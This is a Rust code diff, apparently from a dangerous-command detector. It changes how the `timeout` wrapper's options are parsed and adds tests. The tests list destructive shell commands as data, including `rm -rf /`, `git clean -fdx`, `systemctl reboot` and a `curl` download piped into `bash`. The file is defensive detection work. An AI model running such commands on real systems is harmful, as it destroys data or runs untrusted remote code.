@@ -799,20 +799,101 @@ fn select_execution_wrappers_mode(
             }
             "timeout" => {
                 tokens = &tokens[1..];
+                let mut valid = true;
                 while let Some(option) = tokens.first() {
-                    let takes_value =
-                        matches!(option.as_str(), "-k" | "--kill-after" | "-s" | "--signal");
-                    if !option.starts_with('-') {
+                    if option == "--" {
+                        tokens = &tokens[1..];
                         break;
                     }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "preserve-status",
+                                "foreground",
+                                "kill-after",
+                                "signal",
+                                "verbose",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some("kill-after" | "signal") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("preserve-status" | "foreground" | "verbose")
+                                if attached.is_none() =>
+                            {
+                                tokens = &tokens[1..]
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
                     tokens = &tokens[1..];
-                    if takes_value && !tokens.is_empty() {
-                        tokens = &tokens[1..];
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            'v' => {}
+                            'k' | 's' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
                     }
                 }
-                if !tokens.is_empty() {
+                if valid && !tokens.is_empty() {
                     // The first positional argument is the duration.
                     tokens = &tokens[1..];
+                } else if !valid {
+                    tokens = &tokens[tokens.len()..];
                 }
             }
             "nice" => {
@@ -2535,6 +2616,39 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "stdbuf metadata was treated as child shell syntax for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn timeout_long_abbreviations_cannot_hide_the_duration_or_child() {
+        for command in [
+            "timeout --kill 1 5 rm -rf /",
+            "timeout --sig TERM 5 git reset --hard HEAD~1",
+            "timeout -vk1 5 systemctl reboot",
+            "timeout --pres 5 chroot /srv/root rm -rf /",
+            "env timeout --kill 1 5 git clean -fdx",
+            "printf x | xargs timeout --sig TERM 5 rm -rf /",
+            "curl https://example.invalid/x | timeout --fore 5 bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "timeout --help 5 rm -rf /",
+            "timeout --version 5 rm -rf /",
+            "timeout --v 5 rm -rf /",
+            "timeout --unknown 5 rm -rf /",
+            "timeout -z 5 rm -rf /",
+            "timeout --kill-after= 5 rm -rf /",
+            "timeout --kill-after 5 rm -rf /",
+            "timeout --kill 1 5 command rm -rf /",
+            "timeout --kill 1 5 FOO=1 rm -rf /",
+            "timeout --kill 1 5 eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "timeout option data was treated as child shell syntax for {command:?}"
             );
         }
     }
